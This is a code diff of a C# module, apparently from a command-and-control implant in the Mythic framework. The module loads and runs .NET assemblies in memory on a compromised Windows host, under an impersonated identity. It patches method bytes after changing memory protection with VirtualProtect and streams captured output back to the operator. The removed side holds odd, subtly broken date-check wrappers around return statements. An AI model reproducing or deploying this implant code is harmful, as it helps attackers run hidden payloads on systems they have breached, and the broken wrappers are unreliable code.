@@ -8,9 +8,9 @@
 
 using System;
 using System.Linq;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 using System.Threading;
 using System.IO;
@@ -19,8 +19,8 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Runtime.CompilerServices;
 using System.Security.Principal;
-using PhantomInterop.Classes.Api;
-using PhantomInterop.Utils;
+using ApolloInterop.Classes.Api;
+using ApolloInterop.Utils;
 
 namespace Tasks
 {
@@ -52,13 +52,13 @@ namespace Tasks
 
         private static readonly AutoResetEvent Complete = new AutoResetEvent(false);
         
-        private readonly Action<object> _transmitAction;
+        private readonly Action<object> _sendAction;
 
         private System.Threading.Tasks.Task _sendTask = null;
 
         private static string _output = "";
 
-        private static bool _isFinished = false;
+        private static bool _completed = false;
 
         private Thread _assemblyThread;
         
@@ -68,13 +68,21 @@ namespace Tasks
             _pCommandLineToArgvW =
                 agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
             _pLocalFree = agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
-            _transmitAction = o =>
+            _sendAction = o =>
             {
                 string accumOut = "";
                 string slicedOut = "";
                 int lastOutLen = 0;
-                
-                while (!_isFinished && !_stopToken.IsCancellationRequested)
+                /* Unfortunately, with the way the way Cross AppDomain delegates work,
+                 * we can't invoke functions on private members of the parent class.
+                 * Instead, we have to take the approach of managing concurrent access
+                 * with the agent's output mutex. So long as we have acquired the mutex,
+                 * we ensure we're the only one accessing the static _output variable.
+                 * Then each second, we see what "new" output has been posted by the cross
+                 * AppDomain delegate function. If there is new output, we take the segment
+                 * of the string that is new, and post it to Mythic.
+                 */
+                while (!_completed && !_cancellationToken.IsCancellationRequested)
                 {
                     WaitHandle.WaitAny(new WaitHandle[]
                     {
@@ -111,25 +119,25 @@ namespace Tasks
 
             ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);
 
-            
+            // CommandLineToArgvW returns NULL upon failure.
             if (ptrToSplitArgs == IntPtr.Zero)
                 throw new ArgumentException("Unable to split argument.", new Win32Exception());
 
-            
+            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
             try
             {
                 splitArgs = new string[numberOfArgs];
 
-                
-                
+                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
+                // Copy each of these strings into our split argument array.
                 for (int i = 0; i < numberOfArgs; i++)
                     splitArgs[i] = Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
 
-                if(DateTime.Now.Year > 2020) { return splitArgs; } else { return null; }
+                return splitArgs;
             }
             finally
             {
-                
+                // Free memory obtained by CommandLineToArgW.
                 _pLocalFree(ptrToSplitArgs);
             }
         }
@@ -137,8 +145,8 @@ namespace Tasks
         public override void Kill()
         {
             _assemblyThread.Abort();
-            _isFinished = true;
-            _stopToken.Cancel();
+            _completed = true;
+            _cancellationToken.Cancel();
             Complete.Set();
         }
 
@@ -150,14 +158,21 @@ namespace Tasks
             TextWriter realStdErr = Console.Error;
             try
             {
-                
+                /*
+                     * This output lock ensures that we're the only ones that are manipulating the static
+                     * variables of this class, such as:
+                     * - _output
+                     * - _completed
+                     * These variables communicate across the AppDomain boundary (as they're simple types).
+                     * Output is managed by the _sendTask.
+                     */
                 _agent.AcquireOutputLock();
                 byte[] interopBytes = new byte[0];
-                InlineAssemblyParameters parameters = _dataSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
+                InlineAssemblyParameters parameters = _jsonSerializer.Deserialize<InlineAssemblyParameters>(_data.Parameters);
                 if (!_agent.GetFileManager().GetFileFromStore(parameters.InteropFileId, out interopBytes))
                 {
                     if (_agent.GetFileManager().GetFile(
-                            _stopToken.Token,
+                            _cancellationToken.Token,
                             _data.ID,
                             parameters.InteropFileId,
                             out interopBytes
@@ -175,7 +190,7 @@ namespace Tasks
                             ? new string[0]
                             : ParseCommandLine(parameters.AssemblyArguments);
                         
-                        _sendTask = System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, _stopToken.Token);
+                        _sendTask = System.Threading.Tasks.Task.Factory.StartNew(_sendAction, _cancellationToken.Token);
                         (bool loadedModule, string optionalMessage) = LoadAppDomainModule(stringData, assemblyBytes, new byte[][] { interopBytes });
                         if (loadedModule)
                         {
@@ -193,7 +208,7 @@ namespace Tasks
                 }
                 else
                 {
-                    resp = CreateTaskResponse("Failed to get PhantomInterop dependency.", true, "error");
+                    resp = CreateTaskResponse("Failed to get ApolloInterop dependency.", true, "error");
                 }
             }
             catch (Exception ex)
@@ -206,14 +221,14 @@ namespace Tasks
                 Console.Error.Flush();
                 Console.SetOut(realStdOut);
                 Console.SetError(realStdErr);
-                _isFinished = true;
+                _completed = true;
                 Complete.Set();
                 if (_sendTask != null)
                 {
                     _sendTask.Wait();
                 }
 
-                _isFinished = false;
+                _completed = false;
                 _output = "";
                 _agent.ReleaseOutputLock();
             }
@@ -231,7 +246,7 @@ namespace Tasks
                 isolationDomain.SetThreadPrincipal(new WindowsPrincipal(_agent.GetIdentityManager().GetCurrentImpersonationIdentity()));
                 isolationDomain.SetData("str", sParams);
                 bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
-                
+                // Load dependencies wrapped into a try catch to avoid non critical loading failures from causing the entire module to fail
                 foreach (byte[] dependency in dependencies)
                 {
                     try
@@ -264,7 +279,7 @@ namespace Tasks
 
                 if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
                 {
-                    if(DateTime.Now.Year > 2020) { return (bRet, "Failed to get method pointers"); } else { return null; }
+                    return (bRet, "Failed to get method pointers");
                 }
                 int[] patch = new int[3];
 
@@ -275,7 +290,7 @@ namespace Tasks
                 uint oldprotect = 0;
                 if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
                 {
-                    if(DateTime.Now.Year > 2020) { return (bRet, "Failed to change memory protection"); } else { return null; }
+                    return (bRet, "Failed to change memory protection");
                 }
                 Marshal.WriteByte(codeSleeve, 0x48);
                 Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
@@ -284,7 +299,7 @@ namespace Tasks
                 Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
                 if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
                 {
-                    if(DateTime.Now.Year > 2020) { return (bRet, "Failed to change memory protection"); } else { return null; }
+                    return (bRet, "Failed to change memory protection");
                 }
                 
                 try
@@ -301,12 +316,12 @@ namespace Tasks
                 {
                     
                 }
-                if(DateTime.Now.Year > 2020) { return (bRet,""); } else { return null; }
+                return (bRet,"");
 
             }
             catch (Exception e)
             {
-                if(DateTime.Now.Year > 2020) { return (bRet, e.Message); } else { return null; }
+                return (bRet, e.Message);
             }
             finally
             {
@@ -327,7 +342,7 @@ namespace Tasks
                 Assembly interop2 = null;
                 foreach (var asm2 in AppDomain.CurrentDomain.GetAssemblies())
                 {
-                    if (asm2.FullName.StartsWith("PhantomInterop"))
+                    if (asm2.FullName.StartsWith("ApolloInterop"))
                     {
                         interop2 = asm2;
                         break;
@@ -337,7 +352,7 @@ namespace Tasks
                 {
                     return;
                 }
-                Type tStringEventArgs = interop2.GetType("PhantomInterop.Classes.Events.StringDataEventArgs");
+                Type tStringEventArgs = interop2.GetType("ApolloInterop.Classes.Events.StringDataEventArgs");
                 FieldInfo fiData = tStringEventArgs.GetField("Data");
                 string data = fiData.GetValue(args) as string;
                 if (!string.IsNullOrEmpty(data))
@@ -348,7 +363,7 @@ namespace Tasks
             Assembly interopAsm = null;
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (asm.FullName.StartsWith("PhantomInterop"))
+                if (asm.FullName.StartsWith("ApolloInterop"))
                 {
                     interopAsm = asm;
                 }
@@ -365,7 +380,7 @@ namespace Tasks
             var callbackMethod = (EventHandler<EventArgs>)OnWrite;
             
             
-            Type tWriter = interopAsm.GetType("PhantomInterop.Classes.IO.EventableStringWriter");
+            Type tWriter = interopAsm.GetType("ApolloInterop.Classes.IO.EventableStringWriter");
 
             var writer = Activator.CreateInstance(tWriter);
             EventInfo eiWrite = tWriter.GetEvent("BufferWritten");
@@ -378,7 +393,7 @@ namespace Tasks
             Console.SetError((StringWriter)writer);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Phantom"))
+                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Apollo"))
                 {
                     var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                     if (costuraLoader != null)
